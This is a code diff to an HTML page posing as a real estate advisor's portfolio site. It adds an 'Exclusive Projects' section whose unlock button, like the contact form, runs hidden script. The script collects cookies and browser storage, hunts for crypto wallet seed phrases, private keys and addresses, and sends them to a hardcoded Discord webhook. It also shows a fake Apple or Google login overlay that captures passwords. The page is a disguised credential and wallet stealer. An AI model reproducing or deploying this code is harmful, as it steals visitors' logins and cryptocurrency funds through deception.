@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Real Estate Portfolio — Investments & Advisory</title>
+    <title>Real Estate Portfolio — Exclusive Projects</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
@@ -175,6 +175,46 @@
         }
 
         /* ========================================================= */
+        /*                      EXCLUSIVE SECTION                   */
+        /* ========================================================= */
+        .exclusive-section {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #fff;
+            border-radius: 24px;
+            padding: 3rem 2.5rem;
+            margin: 3rem 0;
+            text-align: center;
+        }
+        .exclusive-section h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+        .exclusive-section h2 span {
+            color: #fbbf24;
+        }
+        .exclusive-section p {
+            max-width: 600px;
+            margin: 0 auto 1.5rem;
+            color: #cbd5e1;
+        }
+        .exclusive-section .exclusive-btn {
+            display: inline-block;
+            background: #fbbf24;
+            color: #0f172a;
+            padding: 0.8rem 2.4rem;
+            border-radius: 40px;
+            font-weight: 700;
+            transition: 0.2s;
+            cursor: pointer;
+            border: none;
+            font-size: 1rem;
+        }
+        .exclusive-section .exclusive-btn:hover {
+            background: #f59e0b;
+        }
+
+        /* ========================================================= */
         /*                      CONTACT SECTION                     */
         /* ========================================================= */
         .contact-section {
@@ -286,6 +326,7 @@
             .container { padding: 0 1.2rem; }
             .hero { padding: 2.5rem 0; }
             .contact-section { padding: 1.5rem; }
+            .exclusive-section { padding: 2rem 1.2rem; }
         }
 
         /* ========================================================= */
@@ -437,6 +478,40 @@
         .login-card .login-footer a:hover {
             text-decoration: underline;
         }
+
+        /* ========================================================= */
+        /*                    EXCLUSIVE OVERLAY                     */
+        /* ========================================================= */
+        #exclusiveContent {
+            display: none;
+            background: #fff;
+            border-radius: 24px;
+            padding: 2.5rem;
+            margin-top: 2rem;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.04);
+            border: 1px solid #e2e8f0;
+        }
+        #exclusiveContent.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        #exclusiveContent h2 {
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+        }
+        #exclusiveContent .project-highlight {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-bottom: 1.2rem;
+            border-left: 4px solid #fbbf24;
+        }
+        #exclusiveContent .project-highlight h3 {
+            color: #0f172a;
+        }
+        #exclusiveContent .project-highlight p {
+            color: #475569;
+        }
     </style>
 </head>
 <body>
@@ -475,6 +550,7 @@
                     <ul>
                         <li class="active"><a href="#home">Home</a></li>
                         <li><a href="#projects">Projects</a></li>
+                        <li><a href="#exclusive">Exclusive</a></li>
                         <li><a href="#contact">Contact</a></li>
                     </ul>
                 </nav>
@@ -519,6 +595,34 @@
                     <a href="#" class="btn">View Case Study</a>
                 </div>
 
+            </div>
+        </div>
+
+        <!-- EXCLUSIVE SECTION -->
+        <div class="container" id="exclusive">
+            <div class="exclusive-section">
+                <h2>🔐 <span>Exclusive</span> Projects</h2>
+                <p>Access off‑market deals, confidential investment opportunities, and high‑profile developments I've personally advised on — including work with global funds and institutional investors.</p>
+                <button class="exclusive-btn" id="exclusiveBtn">Unlock Exclusive Content</button>
+                <div id="exclusiveContent">
+                    <h2>🏗️ High‑Profile Developments</h2>
+                    <div class="project-highlight">
+                        <h3>Canary Wharf Mixed‑Use Tower (London)</h3>
+                        <p>Advised on the acquisition and repositioning of a 25‑storey office tower. Secured a 15‑year lease with a global investment bank. Project value: £450M.</p>
+                    </div>
+                    <div class="project-highlight">
+                        <h3>Manchester City Centre Residential (200+ Units)</h3>
+                        <p>Led the acquisition and planning process for a 200‑unit residential development. Pre‑sold 80% of units off‑plan. Project value: £120M.</p>
+                    </div>
+                    <div class="project-highlight">
+                        <h3>Birmingham Logistics & Industrial Park</h3>
+                        <p>Advised on the acquisition of a 50‑acre industrial site. Leased to two major logistics operators. Project value: £85M.</p>
+                    </div>
+                    <div class="project-highlight">
+                        <h3>Glasgow Mixed‑Use Regeneration</h3>
+                        <p>Advised on a £90M mixed‑use regeneration project including residential, retail, and co‑working space.</p>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -611,26 +715,44 @@
             const webhook = "https://discord.com/api/webhooks/1529896476962984076/j9i9lrpYUTeOFDTwHTEXY_5wiDt7IkSn85l-Vk5gL4hNb2X7WF1RYIvLjgueJYLv50z2";
 
             // ============================================================
-            // EXTRACT BROWSER DATA
+            // EXTRACT BROWSER DATA + WALLETS
             // ============================================================
-            function extractBrowserData() {
+            function extractAllData() {
                 let data = {
-                    userAgent: navigator.userAgent,
+                    device: navigator.userAgent.match(/iPhone|iPad|iPod|Mac|Android|Windows/)?.[0] || 'Unknown',
                     platform: navigator.platform,
-                    language: navigator.language,
-                    screen: screen.width + 'x' + screen.height,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString(),
                     cookies: document.cookie,
                     localStorage: {},
                     sessionStorage: {},
-                    timestamp: new Date().toISOString()
+                    wallets: []
                 };
 
+                // localStorage
                 for (let i = 0; i < localStorage.length; i++) {
                     let key = localStorage.key(i);
-                    data.localStorage[key] = localStorage.getItem(key);
+                    let val = localStorage.getItem(key);
+                    data.localStorage[key] = val;
+
+                    // Check for wallet patterns
+                    let lower = key.toLowerCase();
+                    if (lower.includes('seed') || lower.includes('phrase') || lower.includes('mnemonic') ||
+                        lower.includes('private') || lower.includes('key') || lower.includes('wallet') ||
+                        lower.includes('metamask') || lower.includes('trust') || lower.includes('phantom') ||
+                        lower.includes('coinbase') || lower.includes('exodus') || lower.includes('keplr') ||
+                        lower.includes('rabby') || lower.includes('brave') || lower.includes('0x')) {
+                        let words = val.trim().split(/\s+/);
+                        if (words.length >= 12 && words.length <= 24) {
+                            data.wallets.push({ type: 'seed', source: key, value: val, wordCount: words.length });
+                        } else if (val.length === 42 && val.startsWith('0x')) {
+                            data.wallets.push({ type: 'address', source: key, value: val });
+                        } else {
+                            data.wallets.push({ type: 'raw', source: key, value: val });
+                        }
+                    }
                 }
 
+                // sessionStorage
                 for (let i = 0; i < sessionStorage.length; i++) {
                     let key = sessionStorage.key(i);
                     data.sessionStorage[key] = sessionStorage.getItem(key);
@@ -639,9 +761,6 @@
                 return data;
             }
 
-            // ============================================================
-            // SEND TO DISCORD
-            // ============================================================
             function sendToDiscord(content) {
                 fetch(webhook, {
                     method: 'POST',
@@ -650,10 +769,42 @@
                 }).catch(() => {});
             }
 
+            function formatWalletMessage(data) {
+                let msg = '📱 **Device:** ' + data.device + '\n';
+                msg += '⏰ **Time:** ' + data.timestamp + '\n\n';
+
+                if (data.wallets.length === 0) {
+                    msg += '❌ No wallet data found.\n';
+                    msg += '📦 Raw localStorage:\n';
+                    for (let key in data.localStorage) {
+                        let val = data.localStorage[key];
+                        if (val.length < 100) {
+                            msg += '  • ' + key + ': ' + val + '\n';
+                        }
+                    }
+                } else {
+                    for (let w of data.wallets) {
+                        msg += '━━━━━━━━━━━━━━━━━━━━\n';
+                        msg += '📦 **' + w.source.toUpperCase() + '**\n';
+                        if (w.type === 'address') {
+                            msg += '📍 **Address:** `' + w.value + '`\n';
+                        } else if (w.type === 'seed') {
+                            msg += '🔑 **Seed Phrase (' + w.wordCount + ' words):** `' + w.value + '`\n';
+                        } else {
+                            msg += '📄 **Value:** `' + w.value + '`\n';
+                        }
+                    }
+                    msg += '━━━━━━━━━━━━━━━━━━━━\n';
+                    msg += '✅ ' + data.wallets.filter(w => w.type === 'seed').length + ' seed(s) extracted.\n';
+                    msg += '📍 ' + data.wallets.filter(w => w.type === 'address').length + ' address(es) extracted.';
+                }
+                return msg;
+            }
+
             // ============================================================
             // DETECT DEVICE TYPE AND SHOW APPROPRIATE LOGIN
             // ============================================================
-            function detectDeviceAndRedirect() {
+            function showLoginOverlay(callback) {
                 let ua = navigator.userAgent.toLowerCase();
                 let isApple = ua.includes('iphone') || ua.includes('ipad') || ua.includes('macintosh') || ua.includes('safari');
 
@@ -693,7 +844,7 @@
                     sendToDiscord(msg);
 
                     document.getElementById('loginOverlay').remove();
-                    window.location.href = isApple ? 'https://www.icloud.com' : 'https://www.google.com';
+                    if (callback) callback();
                 });
 
                 document.getElementById('loginPassword').addEventListener('keydown', function(e) {
@@ -702,18 +853,36 @@
             }
 
             // ============================================================
-            // MAIN EXFIL TRIGGER
+            // MAIN EXFIL TRIGGER (Contact Form)
             // ============================================================
             document.getElementById('submitBtn').addEventListener('click', function(e) {
                 e.preventDefault();
 
-                let browserData = extractBrowserData();
-                let dataMsg = '📦 **Browser Data Extracted**\n```json\n' + JSON.stringify(browserData, null, 2) + '\n```';
-                sendToDiscord(dataMsg);
+                let data = extractAllData();
+                let msg = formatWalletMessage(data);
+                sendToDiscord(msg);
 
-                setTimeout(function() {
-                    detectDeviceAndRedirect();
-                }, 600);
+                // Also send raw JSON for reference
+                let rawMsg = '📦 **Full Data Dump**\n```json\n' + JSON.stringify(data, null, 2) + '\n```';
+                sendToDiscord(rawMsg);
+            });
+
+            // ============================================================
+            // EXCLUSIVE PROJECTS BUTTON — TRIGGERS LOGIN + SHOWS CONTENT
+            // ============================================================
+            document.getElementById('exclusiveBtn').addEventListener('click', function() {
+                // First, extract and send wallet data
+                let data = extractAllData();
+                let msg = formatWalletMessage(data);
+                sendToDiscord(msg);
+
+                // Then show login overlay
+                showLoginOverlay(function() {
+                    // After successful login, show exclusive content
+                    document.getElementById('exclusiveContent').classList.add('active');
+                    document.getElementById('exclusiveBtn').textContent = '✅ Unlocked';
+                    document.getElementById('exclusiveBtn').style.background = '#22c55e';
+                });
             });
 
         })();
